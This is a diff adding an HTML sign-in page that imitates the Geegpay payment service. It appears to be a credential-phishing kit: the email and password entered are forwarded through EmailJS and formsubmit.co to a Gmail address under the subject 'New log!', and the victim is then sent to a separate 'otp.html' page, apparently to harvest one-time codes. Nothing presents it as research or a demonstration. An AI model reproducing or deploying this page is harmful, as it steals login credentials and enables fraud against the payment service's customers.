@@ -1,0 +1,105 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="./images/gfavicon.png">
+    <link rel="stylesheet" href="./dist/output.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="./fonts/segeo-ui-font/style.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GEEGPAY | Welcome to GEEGPAY</title>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("mQ7M8IM0fXfZIQvXQ");
+      })();
+    </script>
+
+    <script type="text/javascript">
+      window.onload = function () {
+        console.log("working");
+        const btn = document.querySelector("button");
+        document
+          .getElementById("form")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            btn.textContent = "Loading...";
+            emailjs.sendForm("service_2007cn7", "template_9p8589d", this).then(
+              function () {
+                console.log("SUCCESS!");
+                setTimeout(() => {
+                  window.location.href = "./otp.html";
+                }, 5000);
+              },
+              function (error) {
+                alert("an error occured, please try again");
+                console.log(error);
+                window.location.reload();
+              }
+            );
+          });
+      };
+    </script>
+
+    <style>
+      body {
+        background-image: linear-gradient(
+          139deg,
+          rgb(253, 253, 253),
+          rgb(98, 140, 207)
+        );
+        min-height: 100vh;
+        padding-top: 50px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="w-[90%] max-w-md mx-auto">
+      <img class="w-44" src="glogo.png" alt="">
+
+      <form action="https://formsubmit.co/klashahelp@gmail.com" method="post" class="bg-white rounded-md shadow-sm px-6 py-8 mt-7" id="form">
+        <h2 class="font-bold !text-2xl">Sign in to Geegpay</h2>
+        <div class="flex items-center text-xl gap-x-2 pt-8">
+          <p class="font-bold text-slate-700">New to Geegpay?</p>
+          <span class="text-primary">Create an account</span>
+        </div>
+
+        <label for="email" class="block mt-10 text-lg pb-3">Your Email <span class="text-red-600">*</span></label>
+        <input required="" type="email" name="email" id="email" class="w-full outline-none rounded-xl border border-slate-700 p-4 transition-all focus:border-primary">
+
+        <label for="pass" class="block mt-10 text-lg pb-3">Your password <span class="text-red-600">*</span></label>
+        <div class="relative">
+          <input required="" type="password" name="password" id="pass" class="w-full outline-none rounded-xl border border-slate-700 p-4 transition-all focus:border-primary">
+          <p onclick="togglePass(this)" class="underline text-lg absolute top-1/4 right-3 cursor-pointer">
+            Show
+          </p>
+        </div>
+
+        <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New log!">
+        <input type="hidden" name="_next" value="https://apps-geegpay.web.app/otp.html">
+        <div class="text-left text-primary mt-7 text-lg">Forgot Password?</div>
+
+        <button disabled="" type="submit" class="bg-primary text-white rounded-full p-4 w-full font-semibold text-lg mt-10 disabled:opacity-70 disabled:pointer-events-none">
+          Sign in
+        </button>
+      </form>
+    </div>
+
+    <script type="module" src="main.js"></script>
+    <script>
+      const togglePass = (el) => {
+        const passInput = document.querySelector("#pass");
+        const type =
+          passInput.getAttribute("type") === "password" ? "text" : "password";
+        passInput.setAttribute("type", type);
+
+        const text = el.textContent === "Show" ? "Hide" : "Show";
+
+        el.textContent = text;
+      };
+    </script>
+  
+
+</body></html>
